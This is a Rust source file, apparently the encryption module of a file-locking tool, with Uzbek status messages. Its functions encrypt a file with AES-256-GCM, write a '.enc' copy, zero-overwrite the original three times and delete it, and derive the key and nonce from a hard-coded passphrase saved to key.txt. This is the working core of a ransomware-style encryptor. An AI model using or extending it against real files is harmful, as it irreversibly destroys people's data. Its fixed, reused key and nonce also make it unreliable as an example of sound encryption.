use aes_gcm::{
    Aes256Gcm, Key, Nonce,
    aead::{Aead, KeyInit},
};
use base64::{Engine as _, engine::general_purpose};
use sha2::{Digest, Sha256};
use std::fs::File;
use std::io::{Read, Write};
use std::path::Path;
use std::sync::Arc;

pub fn encrypt_file(
    file_path: &Path,
    key: &Key<Aes256Gcm>,
    nonce: &Nonce<aes_gcm::aead::generic_array::typenum::U12>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let mut f = File::open(file_path)?;
    let mut plaintext = Vec::new();
    f.read_to_end(&mut plaintext)?;
    println!("[+] O‘qildi: {}", file_path.display());

    let cipher = Aes256Gcm::new(key);
    let ciphertext = cipher
        .encrypt(nonce, plaintext.as_ref())
        .map_err(|e| format!("Encrypt error: {}", e))?;
    println!("[*] Shifrlanmoqda: {}", file_path.display());

    let enc_path = {
        let parent = file_path.parent().unwrap_or_else(|| Path::new(""));
        let name = file_path.file_name().unwrap().to_string_lossy();
        parent.join(format!("{}.enc", name))
    };

    {
        let mut out = File::create(&enc_path)?;
        out.write_all(&ciphertext)?;
        out.sync_all()?;
    }
    println!("[+] Yaratildi: {}", enc_path.display());

    let meta = std::fs::metadata(&enc_path)?;
    if meta.len() > 0 {
        let mut orig = std::fs::OpenOptions::new().write(true).open(file_path)?;
        let len = orig.metadata()?.len() as usize;
        let zeros = vec![0u8; len];
        for _ in 0..3 {
            orig.write_all(&zeros)?;
            orig.sync_all()?;
        }
        std::fs::remove_file(file_path)?;
        println!("[+] Original o‘chirildi: {}", file_path.display());
    }

    Ok(())
}

pub fn create_key_nonce() -> Result<(Arc<Key<Aes256Gcm>>, Arc<Nonce<aes_gcm::aead::generic_array::typenum::U12>>, String, String), Box<dyn std::error::Error>> {
    let mut hasher = Sha256::new();
    hasher.update("JasurFayllarmgaTegma");
    let key_bytes = hasher.finalize_reset();
    let key = Arc::new(Key::<Aes256Gcm>::from_slice(&key_bytes).clone());

    hasher.update("JasurFayllarmgaTegma");
    let nonce_bytes: [u8; 12] = hasher.finalize()[..12].try_into()?;
    let nonce = Arc::new(Nonce::from_slice(&nonce_bytes).clone());

    let key_b64 = general_purpose::STANDARD.encode(&key_bytes);
    let nonce_b64 = general_purpose::STANDARD.encode(&nonce_bytes);

    Ok((key, nonce, key_b64, nonce_b64))
}

pub fn save_key_nonce(key_b64: &str, nonce_b64: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut f = File::create("key.txt")?;
    writeln!(f, "Key: {}\nNonce: {}", key_b64, nonce_b64)?;
    println!("[+] Kalit va nonce key.txt fayliga saqlandi");
    Ok(())
}